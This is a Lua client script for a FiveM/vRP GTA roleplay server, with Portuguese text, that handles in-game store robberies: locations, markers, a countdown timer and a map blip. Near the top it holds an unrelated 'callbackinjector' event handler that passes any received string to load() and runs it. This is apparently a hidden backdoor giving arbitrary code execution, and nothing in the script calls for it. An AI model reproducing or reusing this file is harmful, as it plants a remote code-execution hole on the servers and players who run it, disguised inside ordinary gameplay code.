local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
rob = Tunnel.getInterface("vrp_roubos")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local andamento = false
local segundos = 0
local blip = nil
-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO LOCAL DO ROUBO
-----------------------------------------------------------------------------------------------------------------------------------------
local locais = {
	{ id = 13 , x = 2549.43 , y = 384.90 , z = 108.62 , h = 80.0 },
	{ id = 14 , x = 1159.67 , y = -313.91 , z = 69.20 , h = 100.0 },
	{ id = 15 , x = 28.27 , y = -1339.48 , z = 29.49 , h = 0.0 },
	{ id = 16 , x = -709.59 , y = -904.10 , z = 19.21 , h = 90.0 },
	{ id = 17 , x = -43.23 , y = -1748.475 , z = 29.42 , h = 50.0 },
	{ id = 18 , x = 378.17 , y = 333.12 , z = 103.56 , h = 340.0 },
	{ id = 19 , x = -3249.79 , y = 1004.40 , z = 12.83 , h = 80.0 },
	{ id = 20 , x = 1734.72 , y = 6420.65 , z = 35.03 , h = 330.0 },
	{ id = 21 , x = 546.37 , y = 2662.89 , z = 42.15 , h = 190.0 },
	{ id = 22 , x = 1959.38 , y = 3748.83 , z = 32.34 , h = 30.0 },
	{ id = 23 , x = 2672.90 , y = 3286.58 , z = 55.24 , h = 60.0 },
	{ id = 24 , x = 1707.93 , y = 4920.44 , z = 42.06 , h = 320.0 },
	{ id = 25 , x = -1829.23 , y = 798.76 , z = 138.19 , h = 120.0 },
	{ id = 26 , x = -103.96 , y = 6478.23 , z = 31.62 , h = 120.0 },   
	{ id = 27 , x = -83.86 , y = 6213.90 , z = 31.09 , h = 120.0 },    
	{ id = 28 , x = 3560.07 , y = 3671.82 , z = 28.12 , h = 120.0 },  
	{ id = 29 , x = 982.79 , y = -2162.79 , z = 29.47 , h = 120.0 },
	{ id = 30 , x = 5.4061 , y = -1103.579 , z = 29.79 , h = 120.0 },
	{ id = 31 , x = 827.03 , y = -2154.91 , z = 29.61 , h = 120.0 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- ROTEIRO DO ROUBO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		for _,item in pairs(locais) do
			local ped = GetPlayerPed(-1)
			local px,py,pz = table.unpack(GetEntityCoords(ped,true))
			local unusedBool,coordz = GetGroundZFor_3dCoord(item.x,item.y,item.z,1)
			local distancia = GetDistanceBetweenCoords(item.x,item.y,coordz,px,py,pz,true)
			if andamento then
				if IsControlJustPressed(0,244) or GetEntityHealth(ped) <= 100 then
					andamento = false
					rob.CancelandoRoubo()
					ClearPedTasks(ped)
				end
			else
				if distancia <= 20 then
				crjSleep = 1
					DrawMarker(29,item.x,item.y,item.z,0,0,0,0,0,0,1.0,0.7,1.0,50,150,50,200,1,0,0,1)
					if distancia <= 1.5 then
						DisplayHelpText("Aperte ~INPUT_THROW_GRENADE~ para iniciar o roubo")
						if IsControlJustPressed(0,47) and not IsPedInAnyVehicle(ped,false) then
							if GetEntityModel(ped) == GetHashKey("mp_m_freemode_01") or GetEntityModel(ped) == GetHashKey("mp_f_freemode_01") then
								rob.IniciandoRoubo(item.id,item.x,item.y,item.z,item.h)
							else
								TriggerEvent('chatMessage',"ALERTA",{255,70,50},"Você não pode iniciar um roubo utilizando skin de personagem.")
							end
						end
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- INICIANDO O ROUBO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent("iniciarroubo")
AddEventHandler("iniciarroubo",function(secs,head)
	segundos = secs
	andamento = true
	SetEntityHeading(GetPlayerPed(-1),head)
	SetPedComponentVariation(GetPlayerPed(-1),5,45,0,2)
	SetCurrentPedWeapon(GetPlayerPed(-1),GetHashKey("WEAPON_UNARMED"),true)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR ROUBO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if andamento then
			local ui = GetMinimapAnchor()
			drawTxt(ui.right_x+0.230,ui.bottom_y-0.120,1.0,1.0,0.36,"APERTE ~r~M~w~ PARA CANCELAR O ROUBO EM ANDAMENTO",255,255,255,150,4)
			drawTxt(ui.right_x+0.230,ui.bottom_y-0.100,1.0,1.0,0.50,"RESTAM ~g~"..segundos.." SEGUNDOS ~w~PARA TERMINAR",255,255,255,255,4)
			DisableControlAction(0,288,true)
			DisableControlAction(0,289,true)
			DisableControlAction(0,170,true)
			DisableControlAction(0,166,true)
			DisableControlAction(0,187,true)
			DisableControlAction(0,189,true)
			DisableControlAction(0,190,true)
			DisableControlAction(0,188,true)
			DisableControlAction(0,57,true)
			DisableControlAction(0,73,true)
			DisableControlAction(0,167,true)
			DisableControlAction(0,311,true)
			DisableControlAction(0,344,true)
			DisableControlAction(0,29,true)
			DisableControlAction(0,182,true)
			DisableControlAction(0,245,true)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONTAGEM + ENTREGA DA RECOMPENSA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if andamento then
			segundos = segundos - 1
			if segundos <= 0 then
				andamento = false
				ClearPedTasks(GetPlayerPed(-1))
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function DisplayHelpText(str)
	SetTextComponentFormat("STRING")
	AddTextComponentString(str)
	DisplayHelpTextFromStringLabel(0,0,1,-1)
end

function drawTxt(x,y,width,height,scale,text,r,g,b,a,font)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function GetMinimapAnchor()
	local safezone = GetSafeZoneSize()
	local safezone_x = 1.0 / 20.0
	local safezone_y = 1.0 / 20.0
	local aspect_ratio = GetAspectRatio(0)
	local res_x, res_y = GetActiveScreenResolution()
	local xscale = 1.0 / res_x
	local yscale = 1.0 / res_y
	local Minimap = {}
	Minimap.width = xscale * (res_x / (4 * aspect_ratio))
	Minimap.height = yscale * (res_y / 5.674)
	Minimap.left_x = xscale * (res_x * (safezone_x * ((math.abs(safezone - 1.0)) * 10)))
	Minimap.bottom_y = 1.0 - yscale * (res_y * (safezone_y * ((math.abs(safezone - 1.0)) * 10)))
	Minimap.right_x = Minimap.left_x + Minimap.width
	Minimap.top_y = Minimap.bottom_y - Minimap.height
	Minimap.x = Minimap.left_x
	Minimap.y = Minimap.top_y
	Minimap.xunit = xscale
	Minimap.yunit = yscale
	return Minimap
end

RegisterNetEvent('criarblip')
AddEventHandler('criarblip',function(x,y,z)
	if not DoesBlipExist(blip) then
		blip = AddBlipForCoord(x,y,z)
		SetBlipScale(blip,0.5)
		SetBlipSprite(blip,433)
		SetBlipColour(blip,59)
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString("Roubo em andamento")
		EndTextCommandSetBlipName(blip)
		SetBlipAsShortRange(blip,false)
		SetBlipRoute(blip,true)
	end
end)

RegisterNetEvent('removerblip')
AddEventHandler('removerblip',function()
	if DoesBlipExist(blip) then
		RemoveBlip(blip)
		blip = nil
	end
end)